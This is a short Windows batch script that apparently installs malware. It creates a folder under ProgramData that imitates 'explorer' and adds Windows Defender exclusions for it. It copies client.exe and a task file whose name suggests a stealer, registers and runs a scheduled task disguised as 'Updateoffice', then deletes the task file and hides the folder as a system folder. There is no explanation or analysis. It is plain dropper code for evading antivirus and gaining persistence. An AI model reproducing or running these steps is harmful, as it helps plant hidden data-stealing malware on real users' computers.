mkdir %systemdrive%\ProgramData\explorer
powershell -Command Add-MpPreference -ExclusionPath "%systemdrive%\ProgramData\explorer"
powershell -Command Add-MpPreference -ExclusionPath "%systemdrive%\ProgramData\explorer\*.*"
copy Task_File_Plastealer.xml %systemdrive%\ProgramData\explorer
copy client.exe %systemdrive%\ProgramData\explorer
Schtasks /create /xml %systemdrive%\ProgramData\explorer\Task_File_Plastealer.xml /tn "Updateoffice"  
Schtasks /run /tn "Updateoffice" 
del %systemdrive%\ProgramData\explorer\*.xml
attrib +s +h %systemdrive%\ProgramData\explorer
attrib +s +h %systemdrive%\ProgramData\explorer\*.*
